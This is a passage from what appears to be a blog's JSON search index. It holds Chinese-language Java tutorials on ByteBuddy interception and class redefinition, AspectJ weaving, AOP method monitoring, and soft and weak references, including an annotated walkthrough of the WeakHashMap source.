InterceptionAccessor 接口 .make() .load(getClass().getClassLoader()) .getLoaded(); InstanceCreator factory = new ByteBuddy() .subclass(InstanceCreator.class) .method(not(isDeclaredBy(Object.class))) // 非父类 Object 声明的方法 .intercept(MethodDelegation.toConstructor(dynamicUserType)) // 委托拦截的方法来调用提供的类型的构造函数 .make() .load(dynamicUserType.getClassLoader()) .getLoaded().newInstance();UserType userType = (UserType) factory.makeInstance();((InterceptionAccessor) userType).setInterceptor(new HelloWorldInterceptor());String s = userType.doSomething();System.out.println(s); // Hello World! 上述例子将 UserType 类实现了 InterceptionAccessor 接口，同时使用 MethodDelegation.toField 可以使拦截的方法可以委托给新增的字段。 代码参考:https://github.com/wuhaocn/jcode-simple/tree/master/code-gen/bytebuddy 11.参考https://juejin.cn/post/6844903965553852423https://www.cnblogs.com/yungyu16/p/13167240.html","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"字节码","slug":"字节码","permalink":"https://wuhaocn.github.io/tags/%E5%AD%97%E8%8A%82%E7%A0%81/"}]},{"title":"bytebuddy替换类实现","slug":"language/java/bytecode/bytebuddy-替换类实现","date":"2021-08-04T06:25:13.667Z","updated":"2021-08-04T06:25:13.668Z","comments":true,"path":"2021/08/04/language/java/bytecode/bytebuddy-替换类实现/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/java/bytecode/bytebuddy-%E6%9B%BF%E6%8D%A2%E7%B1%BB%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"bytebuddy-替换类实现1.依赖1234dependencies &#123; implementation group: &#x27;net.bytebuddy&#x27;, name: &#x27;byte-buddy&#x27;, version: &#x27;1.11.8&#x27; implementation group: &#x27;net.bytebuddy&#x27;, name: &#x27;byte-buddy-agent&#x27;, version: &#x27;1.11.8&#x27;&#125; 2.测试类被替换类12345678910package org.coral.jcode.simple.bytebuddy.reload;public class Log &#123; public static void log(String a) &#123; System.out.println(&quot;Log: &quot; + a); &#125;&#125; 3.测试类替换目的类12345678910111213package org.coral.jcode.simple.bytebuddy.reload;public class Log4j &#123; /** * 注意代理类要和原实现类的方法声明保持一致 * @param a */ public static void log(String a) &#123; System.err.println(&quot;Log4j: &quot; + a); &#125;&#125; 4.测试验证类123456789101112131415161718192021222324package org.coral.jcode.simple.bytebuddy.reload;import net.bytebuddy.ByteBuddy;import net.bytebuddy.agent.ByteBuddyAgent;import net.bytebuddy.dynamic.loading.ClassReloadingStrategy;import net.bytebuddy.implementation.MethodDelegation;import net.bytebuddy.matcher.ElementMatchers;public class LogMain &#123; public static void main(String[] args) &#123; // 替换 ByteBuddyAgent.install(); new ByteBuddy().redefine(Log.class) .method(ElementMatchers.named(&quot;log&quot;)) .intercept(MethodDelegation.to(Log4j.class)) .make() .load(Thread.currentThread().getContextClassLoader(), ClassReloadingStrategy.fromInstalledAgent()); // 调用 Log.log(&quot;hello&quot;); &#125;&#125; 1Log4j: hello 代码参考:https://github.com/wuhaocn/jcode-simple/tree/master/code-gen/bytebuddy 5.参考https://houbb.github.io/2019/10/30/bytecode-byte-buddy-02-replace","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"字节码","slug":"字节码","permalink":"https://wuhaocn.github.io/tags/%E5%AD%97%E8%8A%82%E7%A0%81/"}]},{"title":"AspectJ使用介绍","slug":"language/java/bytecode/aspectj使用介绍","date":"2021-08-04T06:25:13.666Z","updated":"2021-08-04T06:25:13.666Z","comments":true,"path":"2021/08/04/language/java/bytecode/aspectj使用介绍/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/java/bytecode/aspectj%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"1.AspectJ 使用介绍AspectJ 作为 AOP 编程的完全解决方案，提供了三种织入时机，分别为 compile-time：编译期织入，在编译的时候一步到位，直接编译出包含织入代码的 .class 文件 post-compile：编译后织入，增强已经编译出来的类，如我们要增强依赖的 jar 包中的某个类的某个方法 load-time：在 JVM 进行类加载的时候进行织入 1.1 编译插桩分类编译插桩技术具体可以分为两类，如下所示： 1）、APT（Annotation Process Tools） ：用于生成 Java 代码。 2）、AOP（Aspect Oriented Programming）：用于操作字节码。 我们分别来详细介绍下它们的作用。 1、APT（Annotation Process Tools）总所周知，ButterKnife、Dagger、GreenDao、Protocol Buffers 这些常用的注解生成框架都会在编译过程中生成代码。而 使用 AndroidAnnotation 结合 APT 技术 来生成代码的时机，是在编译最开始的时候介入的。但是 AOP 是在编译完成后生成 dex 文件之前的时候，直接通过修改 .class 文件的方式，来直接添加或者修改代码逻辑的。使用 APT 技术生成 Java 代码的方式具有如下 两方面 的优势： 1）、隔离了框架复杂的内部实现，使得开发更加地简单高效。2）、大大减少了手工重复的工作量，降低了开发时出错的机率。 2、AOP（Aspect Oriented Programming） 而对于操作字节码的方式来说，一般都在 代码监控、代码修改、代码分析 这三个场景有着很广泛的应用。 相对于 Java 代码生成的方式，操作字节码的方式有如下 特点： 1）、应用场景更广。 2）、功能更加强大。 3）、使用复杂度较高。 2.依赖引入以gradle依赖为例 123456789101112131415161718192021buildscript &#123; repositories &#123; mavenLocal() maven &#123; url &#x27;https://plugins.gradle.org/m2/&#x27; &#125; &#125; dependencies &#123; classpath group: &#x27;io.freefair.gradle&#x27;, name: &#x27;aspectj-plugin&#x27;, version: &#x27;5.3.3.3&#x27; &#125;&#125;apply plugin: &quot;io.freefair.aspectj&quot;dependencies &#123; compile group: &#x27;org.aspectj&#x27;, name: &#x27;aspectjweaver&#x27;, version: &#x27;1.9.5&#x27; compile group: &#x27;org.aspectj&#x27;, name: &#x27;aspectjrt&#x27;, version: &#x27;1.9.5&#x27; &#125; aspectj底层依赖库 net.bytebuddy:byte-buddy 3.代码编写 代码地址请参考：https://github.com/wuhaocn/jcode-simple.git 注意下面操作类应放在”src/main/aspectj”包下面 3.1.定义业务类 Account.java123456789101112public class Account &#123; public int balance = 20; public boolean pay(int amount) &#123; if (balance &lt; amount) &#123; return false; &#125; balance -= amount; return true; &#125;&#125; 3.2.定义注解类 AccountAspect.aj1234567891011121314151617181920212223public aspect AccountAspect &#123; pointcut callPay(int amount, Account account): call(boolean com.rcloud.Account.pay(int)) &amp;&amp; args(amount) &amp;&amp; target(account); before(int amount, Account account): callPay(amount, account) &#123; System.out.println(&quot;[AccountAspect]付款前总金额: &quot; + account.balance); System.out.println(&quot;[AccountAspect]需要付款: &quot; + amount); &#125; boolean around(int amount, Account account): callPay(amount, account) &#123; if (account.balance &lt; amount) &#123; System.out.println(&quot;[AccountAspect]拒绝付款!&quot;); return false; &#125; return proceed(amount, account); &#125; after(int amount, Account balance): callPay(amount, balance) &#123; System.out.println(&quot;[AccountAspect]付款后，剩余：&quot; + balance.balance); &#125;&#125; 3.3.使用类 AccountDoWork.java1234567public class AccountDoWork &#123; public static void pay() &#123; Account account = new Account(); account.pay(1); &#125;&#125; 4.AspectJ 的优势与局限性最常用的字节码处理框架有 AspectJ、ASM 等等，它们的相同之处在于输入输出都是 Class 文件。并且，它们都是 在 Java 文件编译成 .class 文件之后，生成 Dalvik 字节码之前执行。而 AspectJ 作为 Java 中流行的 AOP（aspect-oriented programming） 编程扩展框架，其内部使用的是 BCEL框架 来完成其功能。下面，我们就来了解下 AspectJ 具备哪些优势。4.1.AspectJ 的优势 它的优势有两点：成熟稳定、使用非常简单。 1、成熟稳定字节码的处理并不简单，特别是 针对于字节码的格式和各种指令规则，如果处理出错，就会导致程序编译或者运行过程中出现问题。而 AspectJ 作为从 2001 年发展至今的框架，它已经发展地非常成熟，通常不用考虑插入的字节码发生正确性相关的问题。 2、使用非常简单AspectJ 的使用非常简单，并且它的功能非常强大，我们完全不需要理解任何 Java 字节码相关的知识，就可以在很多情况下对字节码进行操控。例如，它可以在如下五个位置插入自定义的代码：1）、在方法（包括构造方法）被调用的位置。2）、在方法体（包括构造方法）的内部。3）、在读写变量的位置。4）、在静态代码块内部。5）、在异常处理的位置的前后。此外，它也可以 直接将原位置的代码替换为自定义的代码。 4.2.AspectJ 的缺陷而 AspectJ 的缺点可以归结为如下 三点： 1、切入点固定AspectJ 只能在一些固定的切入点来进行操作，如果想要进行更细致的操作则很难实现，它无法针对一些特定规则的字节码序列做操作。 2、正则表达式的局限性AspectJ 的匹配规则采用了类似正则表达式的规则，比如 匹配 Activity 生命周期的 onXXX 方法，如果有自定义的其他以 on 开头的方法也会匹配到，这样匹配的正确性就无法满足。 3、性能较低AspectJ 在实现时会包装自己一些特定的类，它并不会直接把 Trace 函数直接插入到代码中，而是经过一系列自己的封装。这样不仅生成的字节码比较大，而且对原函数的性能会有不小的影响。如果想对 App 中所有的函数都进行插桩，性能影响肯定会比较大。如果你只插桩一小部分函数，那么 AspectJ 带来的性能损耗几乎可以忽略不计。5.AspectJ 核心语法简介AspectJ 其实就是一种 AOP 框架，AOP 是实现程序功能统一维护的一种技术。利用 AOP 可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合性降低，提高程序的可重用性，同时大大提高了开发效率。因此 AOP 的优势可总结为如下 两点： 1）、无侵入性。2）、修改方便。 此外，AOP 不同于 OOP 将问题划分到单个模块之中，它把 涉及到众多模块的同一类问题进行了统一处理。比如我们可以设计两个切面，一个是用于处理 App 中所有模块的日志输出功能，另外一个则是用于处理 App 中一些特殊函数调用的权限检查。下面👇，我们就来看看要掌握 AspectJ 的使用，我们需要了解的一些 核心概念。 1、横切关注点对哪些方法进行拦截，拦截后怎么处理。 2、切面（Aspect）类是对物体特征的抽象，切面就是对横切关注点的抽象。 3、连接点（JoinPoint）JPoint 是一个程序的关键执行点，也是我们关注的重点。它就是指被拦截到的点（如方法、字段、构造器等等）。 4、切入点（PointCut）对 JoinPoint 进行拦截的定义。PointCut 的目的就是提供一种方法使得开发者能够选择自己感兴趣的 JoinPoint。 5、通知（Advice）切入点仅用于捕捉连接点集合，但是，除了捕捉连接点集合以外什么事情都没有做。事实上实现横切行为我们要使用通知。它 一般指拦截到 JoinPoint 后要执行的代码，分为 前置、后置、环绕 三种类型。这里，我们需要 注意 Advice Precedence（优先权） 的情况，比如我们对同一个切面方法同时使用了 @Before 和 @Around 时就会报错，此时会提示需要设置 Advice 的优先级。AspectJ 作为一种基于 Java 语言实现的一套面向切面程序设计规范。它向 Java 中加入了 连接点(Join Point) 这个新概念 ，其实它也只是现存的一个 Java 概 念的名称而已。它向 Java 语言中加入了少许新结构，譬如 切入点(pointcut)、通知(Advice)、类型间声明(Inter-type declaration) 和 切面(Aspect)。切入点和通知动态地影响程序流程，类型间声明则是静态的影响程序的类等级结构，而切面则是对所有这些新结构的封装。对于 AsepctJ 中的各个核心概念来说，其 连接点就恰如程序流中适当的一点。而切入点收集特定的连接点集合和在这些点中的值。一个通知则是当一个连接点到达时执行的代码，这些都是 AspectJ 的动态部分。其实连接点就好比是 程序中那一条一条的语句，而切入点就是特定一条语句处设置的一个断点，它收集了断点处程序栈的信息，而通知就是在这个断点前后想要加入的程序代码。此外，AspectJ 中也有许多不同种类的类型间声明，这就允许程序员修改程序的静态结构、名称、类的成员以及类之间的关系。AspectJ 中的切面是横切关注点的模块单元。它们的行为与 Java 语言中的类很象，但是切面 还封装了切入点、通知以及类型间声明。 6.小结AspectJ 的三种织入方式中，个人觉得前面的两种会比较实用一些，因为第三种需要修改启动脚本，对于大型公司来说会比较不友好，需要专门找运维人员配置。 在实际生产中，我们用得最多的还是纯 Spring AOP，通过本文的介绍，相信大家对于 AspectJ 的使用应该也没什么压力了。大家如果对于本文介绍的内容有什么不清楚的，请直接在评论区留言，如果对于 Spring + AspectJ 感兴趣的读者，碰到问题也可以在评论区和大家互动讨论。 7.参考https://javadoop.com/post/aspectjhttps://juejin.cn/post/6844904112396615688","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"AOP","slug":"AOP","permalink":"https://wuhaocn.github.io/tags/AOP/"},{"name":"字节码","slug":"字节码","permalink":"https://wuhaocn.github.io/tags/%E5%AD%97%E8%8A%82%E7%A0%81/"}]},{"title":"bytebuddy实现aop","slug":"language/java/bytecode/bytebuddy-aop","date":"2021-08-04T06:25:13.666Z","updated":"2021-08-04T06:25:13.667Z","comments":true,"path":"2021/08/04/language/java/bytecode/bytebuddy-aop/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/java/bytecode/bytebuddy-aop/","excerpt":"","text":"1.背景最近业务服务需要做一些组件第三方组件监控的事，需要用到字节码修改相关的技术，bytebuddy就是其中一种，网上找了一下bytebuddy相关资料，不少大佬写的不错的帖子就直接拿过来了，下方备注参考连接 本文主要介绍 bytebuddy-aop相关操作 2.ByteBuddy简介Byte Buddy 是一个代码生成和操作库，用于在 Java 应用程序运行时创建和修改 Java 类，无需编译器的帮助。除了Java 类库附带的代码生成实用程序，Byte Buddy 允许创建任意类，并且不限于实现用于创建运行时代理的接口。此外，Byte Buddy 提供了一个方便的 API，用于手动、使用 Java 代理或在构建期间更改类。 简单来说，ByteBuddy是一个可以在运行时动态生成java class的类库。在这篇文章中，我们将会使用ByteBuddy这个框架操作已经存在的类，创建指定的新类，甚至拦截方法调用。 官网：https://bytebuddy.net/#/ 代码地址参考：https://github.com/wuhaocn/jcode-simple.git 3.AOP注解实现3.1 依赖引入 依赖byte-buddy、byte-buddy-agent相关类 1234dependencies &#123; implementation group: &#x27;net.bytebuddy&#x27;, name: &#x27;byte-buddy&#x27;, version: &#x27;1.11.8&#x27;&#125; 3.2 定义相关类定义 注解类、业务类、监听类; 注解类 123@Retention(RetentionPolicy.RUNTIME)public @interface Monitor &#123;&#125; 业务类此处定义监控方法并加上Monitor注解123456789101112public class BizAnnotationService &#123; @Monitor public int foo(int value) &#123; System.out.println(&quot;foo: &quot; + value); return value; &#125; public int bar(int value) &#123; System.out.println(&quot;bar: &quot; + value); return value; &#125;&#125; 监听类实现 @Advice.OnMethodEnter @Advice.OnMethodExit 监听业务123456789101112131415class MonitorAnnotationAdvisor &#123; @Advice.OnMethodEnter public static void onMethodEnter(@Advice.Origin Method method, @Advice.AllArguments Object[] arguments) &#123; if (method.getAnnotation(Monitor.class) != null) &#123; System.out.println(&quot;onMethodEnter &quot; + method.getName() + &quot; with arguments: &quot; + Arrays.toString(arguments)); &#125; &#125; @Advice.OnMethodExit public static void onMethodExit(@Advice.Origin Method method, @Advice.AllArguments Object[] arguments, @Advice.Return Object ret) &#123; if (method.getAnnotation(Monitor.class) != null) &#123; System.out.println(&quot;onMethodExit &quot; + method.getName() + &quot; with arguments: &quot; + Arrays.toString(arguments)); &#125; &#125;&#125; 测试类 测试注解生效 123456789101112131415public class BizAnnotationTest &#123; public static void main(String[] args) throws Exception &#123; BizAnnotationService service = new ByteBuddy() .subclass(BizAnnotationService.class) .method(ElementMatchers.any()) .intercept(Advice.to(MonitorAnnotationAdvisor.class)) .make() .load(BizAnnotationService.class.getClassLoader()) .getLoaded() .newInstance(); service.bar(11111); service.foo(99999); &#125;&#125; 结果输出 123456&gt; Task :code-gen:bytebuddy:BizAnnotationTest.main()bar: 11111onMethodEnter foo with arguments: [99999]foo: 99999onMethodExit foo with arguments: [99999] 4.AOP监听第三方组件4.1 定义相关类定义 业务类、监听类、测试类; 主要原因是调用代码无法增加注解 业务类此处定义监控方法并加上未添加注解 1234567891011public class BizService &#123; public int foo(int value) &#123; System.out.println(&quot;foo: &quot; + value); return value; &#125; public int bar(int value) &#123; System.out.println(&quot;bar: &quot; + value); return value; &#125;&#125; 监听类实现 @Advice.OnMethodEnter @Advice.OnMethodExit 监听业务 1234567891011class MonitorAdvisor &#123; @Advice.OnMethodEnter public static void onMethodEnter(@Advice.Origin Method method, @Advice.AllArguments Object[] arguments) &#123; System.out.println(&quot;onMethodEnter &quot; + method.getName() + &quot; with arguments: &quot; + Arrays.toString(arguments)); &#125; @Advice.OnMethodExit public static void onMethodExit(@Advice.Origin Method method, @Advice.AllArguments Object[] arguments, @Advice.Return Object ret) &#123; System.out.println(&quot;onMethodExit &quot; + method.getName() + &quot; with arguments: &quot; + Arrays.toString(arguments) + &quot; return: &quot; + ret); &#125;&#125; 测试类 测试不添加注解验证 123456789101112131415public class BizServiceTest &#123; public static void main(String[] args) throws Exception &#123; BizService service = new ByteBuddy() .subclass(BizService.class) .method(ElementMatchers.any()) .intercept(Advice.to(MonitorAdvisor.class)) .make() .load(BizService.class.getClassLoader()) .getLoaded() .newInstance(); service.bar(00000); service.foo(99999); &#125;&#125; 结果输出 1234567&gt; Task :code-gen:bytebuddy:BizServiceTest.main()onMethodEnter bar with arguments: [11111]bar: 11111onMethodExit bar with arguments: [11111] return: 11111onMethodEnter foo with arguments: [99999]foo: 99999onMethodExit foo with arguments: [99999] return: 99999 5.监控耗时5.1 定义相关类 业务类耗时处理 12345678public class CostService &#123; public int play(int value) throws Exception &#123; System.out.println(&quot;foo: &quot; + value); Thread.sleep(1000); return value; &#125;&#125; 监控类实现 @RuntimeType通过 Object intercept(@SuperCall Callable&lt;?&gt; callable)返回处理结果 1234567891011public class CostMonitorAdvisor &#123; @RuntimeType public static Object intercept(@SuperCall Callable&lt;?&gt; callable) throws Exception &#123; long start = System.currentTimeMillis(); try &#123; return callable.call(); &#125; finally &#123; System.out.println(&quot;方法耗时：&quot; + (System.currentTimeMillis() - start) + &quot;ms&quot;); &#125; &#125;&#125; 测试类 通过方法委托实现 ByteBuddy#intercept(MethodDelegation.to(CostMonitorAdvisor.class)) 1234567891011121314public class CostServiceTest &#123; public static void main(String[] args) throws Exception &#123; CostService service = new ByteBuddy() .subclass(CostService.class) .method(ElementMatchers.any()) .intercept(MethodDelegation.to(CostMonitorAdvisor.class)) .make() .load(CostService.class.getClassLoader()) .getLoaded() .newInstance(); service.play(11111); &#125;&#125; 结果输出 1234&gt; Task :code-gen:bytebuddy:CostServiceTest.main()play: 11111方法耗时：35ms 带参传递部分构造函数携带参数，这里以redis为例简单写了下带参数传递的类1234567891011ByteBuddy byteBuddy = new ByteBuddy();Class aClass = byteBuddy.subclass(Jedis.class) .method(ElementMatchers.any()) .intercept(MethodDelegation.to(RedisMonitorAdvisor.class)) .make() .load(Jedis.class.getClassLoader()) .getLoaded();Class[] p = &#123;String.class, int.class&#125;;Constructor&lt;Jedis&gt; classDeclaredConstructor = aClass.getDeclaredConstructor(p);Jedis jedis = classDeclaredConstructor.newInstance(&quot;10.3.4.111&quot;, 6379); 6.总结 通过ByteBuddy创建实例，并注入切面可实现横切 可执行onMethodEnter onMethodExit相关操作 RuntimeType监听方法耗时 对象创建需要通过ByteBuddy创建，自己创建类无法实现 无法监控静态对象 7.注解含义 注解 说明 @Argument 绑定单个参数 @AllArguments 绑定所有参数的数组 @This 当前被拦截的、动态生成的那个对象 @Super 当前被拦截的、动态生成的那个对象的父类对象 @Origin 可以绑定到以下类型的参数：Method 被调用的原始方法 Constructor 被调用的原始构造器 Class 当前动态创建的类 MethodHandle MethodType String 动态类的toString()的返回值 int 动态方法的修饰符 @DefaultCall 调用默认方法而非super的方法 @SuperCall 用于调用父类版本的方法 @Super 注入父类型对象，可以是接口，从而调用它的任何方法 @RuntimeType 可以用在返回值、参数上，提示ByteBuddy禁用严格的类型检查 @Empty 注入参数的类型的默认值 @StubValue 注入一个存根值。对于返回引用、void的方法，注入null；对于返回原始类型的方法，注入0 @FieldValue 注入被拦截对象的一个字段的值 @Morph 类似于@SuperCall，但是允许指定调用参数 代码参考:https://github.com/wuhaocn/jcode-simple/tree/master/code-gen/bytebuddy 8.参考https://zhuanlan.zhihu.com/p/151843984https://bytebuddy.net/#/https://www.jianshu.com/p/be2efc2b0e4chttps://blog.csdn.net/generalfu/article/details/106086475","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[]},{"title":"JVM软引用和弱引用","slug":"language/jvm/JVM软引用和弱引用","date":"2021-08-04T06:25:13.665Z","updated":"2021-08-04T06:25:13.666Z","comments":true,"path":"2021/08/04/language/jvm/JVM软引用和弱引用/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/jvm/JVM%E8%BD%AF%E5%BC%95%E7%94%A8%E5%92%8C%E5%BC%B1%E5%BC%95%E7%94%A8/","excerpt":"","text":"一个场景12345如果有一个值，对应的键已经不再使用了, 将会出现什么情况呢？假定对某个键的最后一次引用已经消亡, 不再有任何途径引用这个值的对象了, 但是, 由于在程序中的任何部分没有再出现这个键, 所以, 这个 键/值 对无法从映射中删除.垃圾收集器怎么处理这样的场景呢? 引用出现了! JAVA 中的引用强引用 StrongReference: 普通对象引用，只要还有强引用指向一个对象，就能表明对象还“活着”，垃圾收集器不会碰这种对象。对于一个普通的对象，如果没有其他的引用关系，只要超过了引用的作用域或者显式地将相应（强）引用赋值为 null，就是可以被垃圾收集的了，当然具体回收时机还是要看垃圾收集策略 软引用 SoftReference: 一种相对强引用弱化一些的引用，可以让对象豁免一些垃圾收集，只有当 JVM 认为内存不足时，才会去试图回收软引用指向的对象。JVM 会确保在抛出 OutOfMemoryError 之前，清理软引用指向的对象。软引用通常用来实现内存敏感的缓存，如果还有空闲内存，就可以暂时保留缓存，当内存不足时清理掉，这样就保证了使用缓存的同时，不会耗尽内存, 维护一种非强制性的映射关系 弱引用 WeakReference: 并不能使对象豁免垃圾收集，仅仅是提供一种访问在弱引用状态下对象的途径。这就可以用来构建一种没有特定约束的关系,如果试图获取时对象还在，就使用它，否则重现实例化。它同样是很多缓存实现的选择。这个类对象的引用，一般主要是在 major collection 的时候回收，所以它可能在 minor collection 后仍然存在。 **虚引用 PhantomReference: **The object is the referent of a PhantomReference, and it has already been selected for collection and its finalizer (if any) has run. The term “reachable” is really a misnomer in this case, as there’s no way for you to access the actual object. 不可达, 不影响对象的生命周期, 通过虚引用的 get() 方法永远返回 null. 正如您可能猜到的，向对象生命周期图添加三个新的可选状态会造成混乱。尽管文档指出了从强可达到软、弱和虚到回收的逻辑过程，但实际过程取决于程序创建的引用对象。如果创建 WeakReference 但不创建SoftReference，则对象将直接从强可达到弱可达，再从最终确定到收集。 References and ReferentsA reference object is a layer of indirection between your program code and some other object, called a referent. Each reference object is constructed around its referent, and the referent cannot be changed. 引用意义垃圾回收时的垃圾判定方式: 垃圾回收JVM 在进行垃圾回收的时候，会判定对象是否还存在引用，它会针对不同的引用类型分别对待。弱引用可以用来访问对象，但进行垃圾回收时，如果对象仅有弱引用指向，则仍然会被 GC 回收。 小例子1234567891011121314151617181920// 软引用和弱引用的一个例子// 强引用String str = new String(&quot;str-value&quot;);SoftReference&lt;String&gt; softRef = new SoftReference&lt;String&gt;(str); // 软引用str = null; // 去掉强引用System.gc(); // 垃圾回收器进行回收System.out.println(softRef.get());// 强引用String abc = new String(&quot;abc-value&quot;);WeakReference&lt;String&gt; weakRef = new WeakReference&lt;String&gt;(abc); // 弱引用abc = null; // 去掉强引用System.gc(); // 垃圾回收器进行回收System.out.println(weakRef.get());输出:str-valuenull 123456789101112131415161718192021222324252627282930313233343536373839404142import java.util.HashMap;import java.util.Iterator;import java.util.Map;import java.util.WeakHashMap;public class ReferenceDemo &#123; public static void main(String[] args) &#123; String a = new String(&quot;key-a&quot;); String b = new String(&quot;key-b&quot;); Map map = new HashMap(); map.put(a, &quot;aaa&quot;); map.put(b, &quot;bbb&quot;); Map weakmap = new WeakHashMap(); weakmap.put(a, &quot;aaaa&quot;); weakmap.put(b, &quot;bbbb&quot;); map.remove(a); a = null; // 移除 a 的强引用, key-a 也没人引用了; map.size(); b = null; // 移除 b 的强引用, key-b 还被 map 引用着 map.get(b); map.get(&quot;key-b&quot;); System.gc(); Iterator i = map.entrySet().iterator(); while (i.hasNext()) &#123; Map.Entry en = (Map.Entry) i.next(); System.out.println(&quot;map:&quot; + en.getKey() + &quot;:&quot; + en.getValue()); &#125; Iterator j = weakmap.entrySet().iterator(); while (j.hasNext()) &#123; Map.Entry en = (Map.Entry) j.next(); System.out.println(&quot;weakmap:&quot; + en.getKey() + &quot;:&quot; + en.getValue()); &#125; &#125;&#125;输出map:key-b:bbbweakmap:key-b:bbbb 想说的话1234567891011121314151617181920212223242526272829303132// 平时使用的缓存存在的问题1. 对象都是强引用的2. 不确定单个对象占用的 byte size 大小3. 无法准确的估算创建缓存的时候为其指定一个准确的大小4. JVM 即使报 OOM 也不会清理这些缓存, 失去缓存的意义 =&gt; LRU // 弱引用缓存 WeakHashMap1. key 是经过弱引用化处理的, value 不是2. 即使不被主动调用 remove, clear 方法，元素也是会有机会清除的3. key-value 的清理时机, key 伴随 gc 清理, value 根据 ReferenceQueue 进行清理4. ReferenceQueue5. 为什么会存在 ReferenceQueue ? 我们可以通过 reference.get() 的返回值确定 referent 是否被回收了, 但是现实是我们有大量的引用对象，这么操作是不实际的，一个好的解决方案就出来了 - 引用队列， 在构造时将引用与队列相关联，并且在清除引用后将其放在队列上。要发现哪些引用已被清除, 可以轮询队列。这可以通过后台线程完成，但是在创建新引用时轮询队列通常更简单(WeakHashMap就是这么做的) 引用队列更像是监听器. // 弱引用的特点更适合高速缓存// 引用的状态1. Active: 新创建的实例处于活动状态, 由垃圾收集者进行特殊处理, 收集器检测到引用对象的可访问性已更改为适当的状态后的一段时间，它会将实例的状态更改为挂起或不活动， 这取决于创建实例时是否向队列注册了实例, 在前一种情况下，它还将实例添加到挂起引用列表中.2. Pending: 挂起引用列表的元素，等待引用处理程序线程排队,未注册的实例从不处于此状态.3. Enqueued 在创建实例时向其注册的队列元素. 当实例从其引用队列中移除时,它将变为非活动状态. 未注册的实例从不处于此状态4. Inactive 一旦实例变为非活动状态,其状态将永远不会再改变. 弱引用的应用WeakHashMap (源码分析) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261. 根据 API 文档，当 Map 中的键不再使用，键对应的键值也将自动在 WeakHashMap 中删除。WeakHashMap 中的键为弱键，和其他 Map 接口的实现有些不同；2. 和 HashMap 类似; 但是支持 key 和 value 为 null, 不存在红黑树结构，因为没必要3. 同样不是线程安全的，可以使用 Collections.synchronizedMap(Map map) 来使之线程安全4. 没有实现 Cloneable, Serializable接口, 没有必要public class WeakHashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt; &#123; // 基本组成属性 private static final int DEFAULT_INITIAL_CAPACITY = 16; private static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30; private static final float DEFAULT_LOAD_FACTOR = 0.75f; private static final Object NULL_KEY = new Object(); Entry&lt;K,V&gt;[] table; // 这个 Entry 继承了 WeakReference private int size; private int threshold; private final float loadFactor; /** * Reference queue for cleared WeakEntries * * 队列放的是什么 ? */ private final ReferenceQueue&lt;Object&gt; queue = new ReferenceQueue&lt;&gt;(); int modCount;&#125;// 1. put 方法分析public V put(K key, V value) &#123; Object k = maskNull(key); int h = hash(k); Entry&lt;K,V&gt;[] tab = getTable(); int i = indexFor(h, tab.length); // 遍历 table[i] 链表, 如果找到相同的 key 则将老的 value 用新的 value 替换 for (Entry&lt;K,V&gt; e = tab[i]; e != null; e = e.next) &#123; if (h == e.hash &amp;&amp; eq(k, e.get())) &#123; V oldValue = e.value; if (value != oldValue) e.value = value; return oldValue; &#125; &#125; modCount++;// 修改次数++ Entry&lt;K,V&gt; e = tab[i];// 取得链表的第一个元素 // 构建新的链表（将新元素放在链表最前面）,同时将 key 注册到引用队列 tab[i] = new Entry&lt;&gt;(k, value, queue, h, e); if (++size &gt;= threshold) resize(tab.length * 2); return null;&#125;private static Object maskNull(Object key) &#123; return (key == null) ? NULL_KEY : key;&#125;final int hash(Object k) &#123; int h = k.hashCode(); h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);&#125;private Entry&lt;K,V&gt;[] getTable() &#123; expungeStaleEntries(); return table;&#125;// 将引用队列里的元素拿出来，修正 table 中的无效数据private void expungeStaleEntries() &#123; for (Object x; (x = queue.poll()) != null; ) &#123; synchronized (queue) &#123; @SuppressWarnings(&quot;unchecked&quot;) Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;) x;// queue 放的是元素, 将要被清理的元素 int i = indexFor(e.hash, table.length);// 定位在 table 数组的位置 Entry&lt;K,V&gt; prev = table[i];// 取得 table [i] 处链表的第一个元素 Entry&lt;K,V&gt; p = prev; while (p != null) &#123;// 链表是否为空或者是否是链表的最后一个元素 Entry&lt;K,V&gt; next = p.next; if (p == e) &#123; // 找到了要被清理的元素 if (prev == e)// prev 不一定和 p 相同 table[i] = next; // 用下一个元素对 e 元素替换 else prev.next = next; // 修复链接 // Must not null out e.next; // stale entries may be in use by a HashIterator e.value = null; // Help GC size--; break; &#125; prev = p; // 没找到要被清理的元素,交换指针,移动位置,继续比对 p = next; &#125; &#125; &#125;&#125;Entry(Object key, V value, ReferenceQueue&lt;Object&gt; queue, int hash, Entry&lt;K,V&gt; next) &#123; super(key, queue); this.value = value; this.hash = hash; this.next = next;&#125;/** * Creates a new weak reference that refers to the given object and is * registered with the given queue. * * @param referent object the new weak reference will refer to * @param q the queue with which the reference is to be registered, * or &lt;tt&gt;null&lt;/tt&gt; if registration is not required * * 监听器效果, 如果引用的对象被回收(reference.get() == null)，则将其加入该队列 */public WeakReference(T referent, ReferenceQueue&lt;? super T&gt; q) &#123; super(referent, q);&#125;Reference(T referent, ReferenceQueue&lt;? super T&gt; queue) &#123; this.referent = referent; this.queue = (queue == null) ? ReferenceQueue.NULL : queue;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243// 2. get 方法分析public V get(Object key) &#123; Object k = maskNull(key); int h = hash(k); 